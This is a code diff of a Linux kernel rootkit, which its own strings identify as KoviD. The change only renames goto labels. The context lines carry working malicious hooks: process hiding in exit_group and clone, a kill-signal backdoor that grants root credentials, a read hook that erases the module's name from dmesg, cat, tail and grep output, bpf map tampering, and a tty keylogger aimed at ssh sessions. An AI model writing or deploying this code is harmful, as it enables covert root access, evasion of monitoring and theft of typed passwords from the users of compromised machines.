@@ -60,7 +60,7 @@ static asmlinkage long m_exit_group(struct pt_regs *regs)
 
 	// load the status of PID
 	if (!kv_find_hidden_pid(&status, current->pid))
-		goto orig;
+		goto resume;
 
 	// back-door?
 	if (status.saddr) {
@@ -71,7 +71,7 @@ static asmlinkage long m_exit_group(struct pt_regs *regs)
 		kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
 	}
 
-orig:
+resume:
 	return real_m_exit_group(regs);
 }
 
@@ -90,7 +90,7 @@ static asmlinkage long m_clone(struct pt_regs *regs)
 
 	// Only proceed if _parent_ IS hidden
 	if (!kv_find_hidden_pid(&status, task->parent->pid))
-		goto m_clone;
+		goto resume;
 
 	// Only proceed if _child_ ISN'T hidden
 	status.saddr = 0;
@@ -108,7 +108,7 @@ static asmlinkage long m_clone(struct pt_regs *regs)
 		spin_unlock(&hide_once_spin);
 	}
 
-m_clone:
+resume:
 	return real_m_clone(regs);
 }
 
@@ -133,7 +133,7 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 		struct cred *new = prepare_creds();
 
 		if (!new || !kaddr || !kaddr->k_sys_setreuid)
-			goto leave;
+			goto resume;
 
 		new->uid.val = new->gid.val = 0;
 		new->euid.val = new->egid.val = 0;
@@ -154,7 +154,7 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 		prinfo("Cool! Now run your command\n");
 	}
 
-leave:
+resume:
 	return real_m_kill(regs);
 }
 
@@ -261,11 +261,11 @@ static asmlinkage long m_read(struct pt_regs *regs)
 	rv = real_m_read(regs);
 
 	if (_ftrace_intercept(regs))
-		goto out;
+		goto leave;
 
 	fs = fs_get_file_node(current);
 	if (!fs || !fs->filename)
-		goto out;
+		goto leave;
 
 	// ugly hack special case :(
 	is_dmesg = !strcmp(fs->filename, "dmesg");
@@ -274,18 +274,18 @@ static asmlinkage long m_read(struct pt_regs *regs)
 	if ((!is_dmesg) && (strcmp(fs->filename, "cat") != 0) &&
 	    (strcmp(fs->filename, "tail") != 0) &&
 	    (strcmp(fs->filename, "grep") != 0))
-		goto out;
+		goto leave;
 
 	size = PT_REGS_PARM3(regs);
 	if (!(buf = (char *)kzalloc(size + 1, GFP_KERNEL)))
-		goto out;
+		goto leave;
 
 	arg = (const char __user *)PT_REGS_PARM2(regs);
 	if (!copy_from_user((void *)buf, (void *)arg, size)) {
 		int dest = ((strstr(buf, MODNAME) || strstr(buf, "kovid") ||
 			     strstr(buf, "journald")));
 		if (!dest)
-			goto out;
+			goto leave;
 
 		// if KoviD is here, skip
 		if (is_dmesg ||
@@ -299,17 +299,17 @@ static asmlinkage long m_read(struct pt_regs *regs)
 				olen = rv;
 
 			if (copy_to_user((char __user *)arg, obuf, olen))
-				goto out;
+				goto leave;
 
 			if (olen < rv) {
 				if (copy_to_user((char __user *)arg + olen,
 						 "\0", 1))
-					goto out;
+					goto leave;
 			}
 			rv = olen;
 		}
 	}
-out:
+leave:
 	kv_mem_free(&fs, &buf);
 	return rv;
 }
@@ -366,17 +366,17 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	void *key = NULL, *value = NULL;
 	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
-	// Call original
+	// Call original first this time
 	ret = real_m_bpf(regs);
 	if (ret < 0)
-		goto out;
+		goto leave;
 
 	if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
-		goto out;
+		goto leave;
 
 	uattr = (union bpf_attr __user *)PT_REGS_PARM2(regs);
 	if (copy_from_user(attr, uattr, size))
-		goto out;
+		goto leave;
 
 	ks = kv_kall_load_addr();
 	if (ks && ks->k_bpf_map_get) {
@@ -393,7 +393,7 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 
 		if (!smap) {
 			prerr("smap error\n");
-			goto out;
+			goto leave;
 		}
 
 		// To extract the value, we must traverse the stack:
@@ -411,25 +411,25 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 
 			key = kmalloc(map->key_size, GFP_KERNEL);
 			if (!key)
-				goto out;
+				goto leave;
 
 			if (copy_from_user(key, ukey, map->key_size))
-				goto out;
+				goto leave;
 
 			id = *(u32 *)key;
 			if (unlikely(id >= smap->n_buckets)) {
 				prerr("id error: id=%d key=%p\n", id, key);
-				goto out;
+				goto leave;
 			}
 
 			bucket = xchg(&smap->buckets[id], NULL);
 			if (!bucket)
-				goto out;
+				goto leave;
 
 			value_size = bpf_map_value_size(map);
 			value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);
 			if (!value)
-				goto out;
+				goto leave;
 
 			trace_len = bucket->nr * stack_map_data_size(map);
 			memcpy(value, bucket->data, trace_len);
@@ -463,7 +463,7 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 		}
 	}
 
-out:
+leave:
 	kv_mem_free(&key, &value, &attr);
 	return ret;
 }
@@ -899,7 +899,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 	ssize_t rv = real_tty_read(iocb, to);
 #endif
 	if (rv <= 0)
-		goto out;
+		goto leave;
 
 	ttybuf = kzalloc(rv + 1, GFP_KERNEL);
 	if (ttybuf) {
@@ -910,25 +910,25 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
 		if (copy_from_user(ttybuf, buf, rv))
-			goto out;
+			goto leave;
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
 		const struct iovec *iov = iter_iov(to);
 		if (!iov || !iov->iov_base)
-			goto out;
+			goto leave;
 
 		if (copy_from_user(ttybuf, iov->iov_base, rv))
-			goto out;
+			goto leave;
 #else
 		if (!to->iov || !to->iov->iov_base)
-			goto out;
+			goto leave;
 
 		if (copy_from_user(ttybuf, to->iov->iov_base, rv))
-			goto out;
+			goto leave;
 #endif
 
 		fs = fs_get_file_node(current);
 		if (!fs)
-			goto out;
+			goto leave;
 
 		if (!strncmp(fs->filename, "ssh", 3))
 			app_flag |= APP_SSH;
@@ -953,7 +953,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 			kv_key_update(&tty_sys_ctx, uid, byte, flags);
 		}
 	}
-out:
+leave:
 	kv_mem_free(&ttybuf, &fs);
 	return rv;
 }
